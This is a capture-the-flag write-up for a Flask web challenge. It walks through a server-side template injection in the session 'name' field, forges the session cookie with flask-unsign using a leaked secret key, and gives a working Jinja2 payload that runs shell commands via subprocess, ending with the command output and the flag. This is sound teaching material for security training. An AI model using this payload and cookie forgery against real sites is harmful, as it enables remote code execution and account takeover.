# Rose - Web Exploitation

## Ideas
In this challenge, participants are provided with a website along with its corresponding source code. The website was builded with flask and have a SSTI vulnerability in `/dashboard` route with SSTI injection in session `name`.

```python
@main.route('/dashboard')
@login_required
def dashboard():
    template = '''
{% extends "base.html" %} {% block content %}
<h1 class="title">
    Welcome, '''+ session["name"] +'''!
</h1>
<p> The dashboard feature is currently under construction! </p>
{% endblock %}
'''
    return render_template_string(template)
```

To access the `/dashboard` route, we need to authenticated to the website first, but no credentials is provided in the source code. 
To reach this, we can run the code in our local machine (with uncomment signup route), after that signup and login to get our cookie and session

```bash
➜ export FLASK_APP=__init__.py 
➜ flask run
 * Serving Flask app '__init__.py'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit

```

Session Cookie:
```
.eJwljjkOQjEMRO-SmsKO4yX_MshJHEEBxV8qxN2JRDczb4r3Sfe5x_FI27lfcUv350hbGixknbLhwBxg2tQLttHWIKhKlVqU6gpq3S2GaK4COdy4d50xp9EAhm5EDMyKtQM6SSkLOIEJu7MaVpyj8QTx6tNkfbRjWiLXEfvfJq_69leseMZxpu8PAt0ydA.ZNo-gw.FIa3S3O44bYHbwRjGnjA-Gt38lM
```

We can decode the session cookie with flask-unsign (https://pypi.org/project/flask-unsign/)

```bash
➜ flask-unsign --decode --cookie ".eJwljjkOQjEMRO-SmsKO4yX_MshJHEEBxV8qxN2JRDczb4r3Sfe5x_FI27lfcUv350hbGixknbLhwBxg2tQLttHWIKhKlVqU6gpq3S2GaK4COdy4d50xp9EAhm5EDMyKtQM6SSkLOIEJu7MaVpyj8QTx6tNkfbRjWiLXEfvfJq_69leseMZxpu8PAt0ydA.ZNo-gw.FIa3S3O44bYHbwRjGnjA-Gt38lM"
{'_fresh': True, '_id': 'd5638c3281d12e087b7a41bdb81d6177393be49a7078ca8ed6729602ea85cc7feff83d050c8335055719c01a364483da30865aa578191fdb5f06a9af861a37c1', '_user_id': '2', 'name': 'test'}
```

After that, tamper the session name to SSTI payload with the provided `SECRET_KEY` in source code

```bash
➜ flask-unsign --sign --cookie "{'_fresh': True, '_id': 'd5638c3281d12e087b7a41bdb81d6177393be49a7078ca8ed6729602ea85cc7feff83d050c8335055719c01a364483da30865aa578191fdb5f06a9af861a37c1', '_user_id': '1', 'name': '{{[].__class__.__mro__[1].__subclasses__()[502](request.args.cmd,shell=True,stdout=-1).communicate()}}'}" --secret 'SuperDuperSecureSecretKey1234!'
.eJwlj8FuwyAQRP-FkyOlFhjDQqT8RW9WhBZYmkh2rIA5Wf734vY282YOMztzKVN5stuWK12Ze0V2Y1FpaYIcjIhiIG7AA47CR9-AFgDSSk-jReBgAhqKGgar-UBoVAiQKCUjI1c8GCkVVwqEDVyg1OPYApTcaIWowAgrUvQqcY0Wk9GtA0GwNqQWyv9rTvvGhZrc9-nROxdmLMW5ppa8OjeJE5bq_zi1pLtMig-PLtOnUtl6zD-lD0u8lifN8_37_Fq2uNbt_iUufViXpb5fATfqLsfBjl8pqVW0.ZNpCxQ.kwGtIvnYiY8htYIQEiE7_CGPIKQ
```

SSTI Payload:
```
{{[].__class__.__mro__[1].__subclasses__()[502](request.args.cmd,shell=True,stdout=-1).communicate()}}
```

After that, request to `/dashboard` route with signed session cookie and grab the flag
```bash
➜ curl "https://nessus-rose.chals.io/dashboard?cmd=cat+/home/ctf/flag.txt" -H "Cookie: session=.eJwlj8FuwyAQRP-FkyOlFhjDQqT8RW9WhBZYmkh2rIA5Wf734vY282YOMztzKVN5stuWK12Ze0V2Y1FpaYIcjIhiIG7AA47CR9-AFgDSSk-jReBgAhqKGgar-UBoVAiQKCUjI1c8GCkVVwqEDVyg1OPYApTcaIWowAgrUvQqcY0Wk9GtA0GwNqQWyv9rTvvGhZrc9-nROxdmLMW5ppa8OjeJE5bq_zi1pLtMig-PLtOnUtl6zD-lD0u8lifN8_37_Fq2uNbt_iUufViXpb5fATfqLsfBjl8pqVW0.ZNpCxQ.kwGtIvnYiY8htYIQEiE7_CGPIKQ" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1439  100  1439    0     0    896      0  0:00:01  0:00:01 --:--:--   896
    Welcome, (b&#39;flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}\n&#39;, None)!
```


## Flag

flag{wh4ts_1n_a_n4m3_4nd_wh4ts_in_y0ur_fl4sk}
